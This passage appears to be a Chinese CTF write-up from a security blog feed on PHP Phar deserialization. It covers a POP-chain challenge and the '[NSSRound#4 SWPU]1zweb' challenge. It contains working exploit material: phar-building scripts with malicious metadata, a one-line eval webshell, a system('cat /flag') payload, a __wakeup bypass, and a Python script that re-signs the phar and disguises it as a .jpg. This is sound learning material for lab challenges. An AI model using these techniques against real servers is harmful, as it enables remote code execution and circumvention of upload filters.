language_">$this</span>-&gt;content=<span class="hljs-string">&quot;\&lt;?php @eval(\$_POST[1]);?&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span>-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;func&#125;(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);  <span class="hljs-comment">//这行至关重要，这里可以进行传参</span><br><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">zz</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;surprise&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename=<span class="hljs-variable">$filename</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;filename))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;这不合理&#x27;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>&#123;<br>        <span class="hljs-variable">$filename</span>=<span class="hljs-variable language_">$this</span>-&gt;filename;<br>        <span class="hljs-variable">$lt</span>=<span class="hljs-variable language_">$this</span>-&gt;filename-&gt;<span class="hljs-variable">$var</span>;<br>        <span class="hljs-comment">//此功能废弃，不想写了</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFile</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter</span>();<br>        <span class="hljs-variable">$contents</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$contents</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;404 not found&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;method&#x27;</span>]&#125;(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;var&#x27;</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;content;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xx</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-string">&#x27;eval&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;arg=<span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;<br>        <span class="hljs-variable">$name</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="反序列化关键讲解"><a href="#反序列化关键讲解" class="headerlink" title="反序列化关键讲解"></a><strong>反序列化关键讲解</strong></h5><p>1.漏洞点在哪？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>.    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-string">&#x27;eval&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;arg=<span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br><span class="hljs-number">2</span>.    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;method&#x27;</span>]&#125;(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;var&#x27;</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;content;<br><span class="hljs-number">3</span>.    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span>-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;func&#125;(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <br></code></pre></td></tr></table></figure><p>我选择从第三个入手，因为没法确定是否phpinfo里面可以给我显示flag，选择从木马文件这里入手，而且上面有一个很明显的提示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>      <span class="hljs-variable language_">$this</span>-&gt;content=<span class="hljs-string">&quot;\&lt;?php @eval(\$_POST[1]);?&gt;&quot;</span>;<br>  &#125;<br></code></pre></td></tr></table></figure><p>而且第三个里面有<strong>动态调用方法：</strong> 在这里，使用了动态调用方法的语法，<code>-&gt;&#123;$this-&gt;func&#125;</code> 表示调用对象中 <code>$this-&gt;func</code> 属性所指定的方法。这里的 <code>$this-&gt;func</code> 可能包含一个方法名，它决定了要调用的方法。<strong>我可以利用assert函数等</strong></p><p>2.链子构造？</p><p>现在很明确的一点是从__get魔术方法开始，<code>__get</code> 方法在对象中访问私有或不存在的属性时会被自动调用。下面呈现一下链子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">zz</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ff</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$content</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;assert&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">xx</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">zz</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;surprise&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ff</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xx</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">aa</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment"># 下面这部分就没改  ##这里其实就是一个固定的创建文件</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-comment">//签名自动计算</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><p>不看下面的创建文件代码，我们上面的说了两个关键是触发函数的设置以及get方法怎么触发，所以先把func声明为assert(在后期被利用后，这里会触发class.php的tostring方法，在后面的传参说)，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ff</span>();<br></code></pre></td></tr></table></figure><p> 这个是触发的方法：</p><p>这行代码创建了一个新的 <code>ff</code> 类的实例，并将其赋值给 <code>filename</code> 属性。在这个过程中，<code>filename</code> 属性实际上是一个 <code>ff</code> 类的对象。</p><p>在 <code>ff</code> 类中，有一个 <code>__get</code> 方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span>-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;func&#125;(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个 <code>__get</code> 方法会在访问 <code>ff</code> 类对象的未定义属性时触发。由于 <code>$this-&gt;filename</code> 是 <code>ff</code> 类的一个实例，当你访问 <code>$this-&gt;filename</code> 时，实际上是在访问 <code>ff</code> 类对象的属性。</p><p>因此，<code>__get</code> 方法被触发是因为在 <code>ff</code> 类对象中访问了未定义的属性（即 <code>filename</code>）</p><h5 id="phar伪协议"><a href="#phar伪协议" class="headerlink" title="phar伪协议"></a><strong>phar伪协议</strong></h5><p> “phar:&#x2F;&#x2F;”</p><p>phar:&#x2F;&#x2F;伪协议<br>这个就是php解压缩报的一个函数，不管后缀是什么，都会当做压缩包来解压，用法：?file&#x3D;phar:&#x2F;&#x2F;压缩包&#x2F;内部文件 phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php 注意 PHP&gt;&#x3D;5.3.0压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。步骤：写一个一句话木马shell。php，然后用zip协议解压缩为shell.zip。然后将后缀改为png等其他格式</p><p>分析一下payload:</p><p>file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;d3919c7d5f0953dfa110c11f3a108be7.txt&amp;method&#x3D;write&amp;var&#x3D;content&amp;cmd&#x3D;system(‘cat &#x2F;flag’);</p><p>前面那句话就相当于解压phar，后面method和var是源码中需要的传参，这段代码的目的是根据通过POST请求发送的<code>method</code>参数调用相应的类方法，并传递<code>var</code>参数，然后返回类中的<code>content</code>属性的值。</p><h3 id="NSSRound-4-SWPU-1zweb"><a href="#NSSRound-4-SWPU-1zweb" class="headerlink" title="[NSSRound#4 SWPU]1zweb"></a><strong>[NSSRound#4 SWPU]1zweb</strong></h3><p>（只说预期解）考点phar文件上传+绕过stub限制获取flag</p><h4 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h4><p><img src="https://note.youdao.com/yws/api/personal/file/WEBe3d80bf5bf2c941ffc748bf799ee2c06?method=download&shareKey=5d9ea465229f627065a4a97416a9b36a" alt="img"></p><h4 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h4><p>与上个题一样查阅源码加上f12里的一部分，这里学了一手整理代码Shift+Alt+F直接格式化整理：</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoveNss</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ljt</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dky</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ljt=<span class="hljs-string">&quot;ljt&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;dky=<span class="hljs-string">&quot;dky&quot;</span>;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;ljt===<span class="hljs-string">&quot;Misc&quot;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;dky===<span class="hljs-string">&quot;Re&quot;</span>)<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ljt=<span class="hljs-string">&quot;Re&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;dky=<span class="hljs-string">&quot;Misc&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>upload.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传异常&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$allowedExts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>);<br>    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>);<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>, <span class="hljs-variable">$allowedExts</span>)))&#123;<br>        <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>        <span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&quot;__HALT_COMPILER();&quot;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$pos</span>)===<span class="hljs-string">&quot;integer&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ltj一眼就发现了phar&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;./upload/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot; 文件已经存在&quot;</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;./upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-string">&quot;w&quot;</span>);<br>                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>, <span class="hljs-variable">$content</span>);<br>                <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传成功 ./upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>            &#125;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;dky不喜欢这个文件 .&quot;</span>.<span class="hljs-variable">$extension</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>index.php里面绕过_wakeup魔术方法，考虑增加自然属性个数或增加属性个数来绕过。</p><p>但是upload.php里面会检查stub,所以压缩文件成zip（注意要用010改变属性个数，不然签名会改变）,用phar:&#x2F;&#x2F;伪协议来读取文件。</p><p>phar压缩：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LD</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ljt</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dky</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ljt=<span class="hljs-string">&quot;Misc&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;dky=<span class="hljs-string">&quot;Re&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;cmd=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">LD</span>();<br> <br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;nss.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);<br> <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>记得首先需要丢入010 editior进行修改属性数量，绕过wakeup()函数，提交发现文件没有运行，所以考虑可能是压缩文件格式的问题，用gzip压缩成gz，得到nss.phar.gz，改文件名为a.jpg上交，用phar伪协议读取发现签名损坏，所以要进行签名修复，phar由data,data签名（20位）,和签名格式（8位）组成。</p><p>（这里贴一下大佬的代码，注意适当改文件路径）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br> <br><span class="hljs-keyword">import</span> gzip<br> <br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;C:\networkSafe\phpstudy_pro\WWW\aa.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br> <br>data = file[:-<span class="hljs-number">28</span>]  <span class="hljs-comment"># 获取需要签名的数据</span><br><span class="hljs-comment"># data = data.replace(b&#x27;3:&#123;&#x27;, b&#x27;4:&#123;&#x27;) #更换属性值，绕过__wakeup</span><br> <br>final = file[-<span class="hljs-number">8</span>:]  <span class="hljs-comment"># 获取最后8位GBMB标识和签名类型</span><br> <br>newfile = data + sha1(data).digest() + final  <span class="hljs-comment"># 数据 + 签名 + 类型 + GBMB</span><br> <br><span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;C:\networkSafe\phpstudy_pro\WWW\new.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(newfile)  <span class="hljs-comment"># 写入到新的phar文件</span><br> <br>newf = gzip.compress(newfile)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;C:\networkSafe\phpstudy_pro\WWW\2.jpg&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file: <span class="hljs-comment">#更改文件后缀</span><br>     file.write(newf)<br></code></pre></td></tr></table></figure><p>修复之后的b,jpg就能得到flag了</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a><strong>总结：</strong></h2><p>其实对于phar的文件上传， 其实他具体的说只不过是一种文件上传的另类。他与其它不一样之处就在于它要实现功能是靠自己构造的pop链与源代码的序列化与反序列化实现，序列化数据无法直接上传，就依托phar的压缩与解压缩的读取来实现</p><p>鸣谢借鉴文章：</p><p><a href="https://blog.csdn.net/m0_70819573/article/details/129506508">NSSRound#4 SWPU]1zweb-CSDN博客</a></p><p>[PHP Phar反序列化学习 - Zh1z3ven - 博客园 (cnblogs.com)](<a href="https://www.cnblogs.com/CoLo/p/16786627.html#:~:text=Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://www.cnblogs.com/CoLo/p/16786627.html#:~:text=Phar反序列化</a> Phar之所以能反序列化，是因为Phar文件会以序列化的形式存储用户自定义的 meta-data%2CPHP使用,phar_parse_metadata 在解析meta数据时，会调用 php_var_unserialize 进行反序列化操作。)</p>]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HELLO</title>
